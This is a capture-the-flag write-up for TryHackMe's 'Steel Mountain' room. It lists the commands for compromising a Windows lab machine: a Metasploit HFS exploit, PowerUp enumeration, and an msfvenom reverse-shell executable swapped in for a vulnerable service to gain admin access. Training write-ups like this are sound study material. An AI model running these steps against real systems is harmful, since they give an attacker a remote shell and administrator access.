# Steel Mountain

Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.

<img align="right" src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/steelmountain/steelmountain01.png" width="150" height="150">

LINK = [https://tryhackme.com/room/steelmountain](https://tryhackme.com/room/steelmountain)

### FYI
This writeup don't include any passwords/cracked hashes/flags

# Description
In this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.

# Steps

1: Scan the machine to discover how many ports are open
* ```nmap -sV <ip-virtual-machine>```

<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/steelmountain/steelmountain02.png" width="50%">

2: Search an exploit for that web server version [HERE](https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec/)
* ```mfsconsole```
* ```use exploit/windows/http/rejetto_hfs_exec```
* ```set RHOST <ip-virtual-machine>```
* ```set RPORT <port-virtual-machine-web-server>```
* ```exploit```
* Go to Bill's desktop and ge the flag

<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/steelmountain/steelmountain03.png" width="50%">

3: Now that we have access to the target as Bill it's time to escalate privileges
* Download the exploit script in your Desktop from [HERE](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
* Upload the script to the target using meterpreter

<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/steelmountain/steelmountain04.png" width="50%">

* ```load powershell```
* ```powershell_shell```
* ```. .\PowerUp.ps1```

4: Now that we know which service can be used to escalate privileges let's create a reverse shell as an Windows executable
* ```cd /root```
* ```msfvenom -p windows/shell_reverse_tcp LHOST=<your-ip> LPORT=<port-you-are-listening> -e x86/shikata_ga_nai -f exe-service -o ASCService.exe```
* In the target machine locate in the directory where the affected application is ```cd C:\Program Files (x86)\IObit```
* Upload the script to the target using meterpreter ```upload /root/ASCService.exe```
* Open a shell ```shell```
* Stop the service ```sc stop AdvancedSystemCareService9```
* Reeplace the exe file```COPY ASCService.exe "Advanced SystemCare"```
* Open a nc listener ```nc -lvp <port-you-are-listening>```
* Stop the service ```sc start AdvancedSystemCareService9```
* We got a new session with admin privileges

<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/steelmountain/steelmountain05.png" width="50%">

4: Get the flag!! 😎
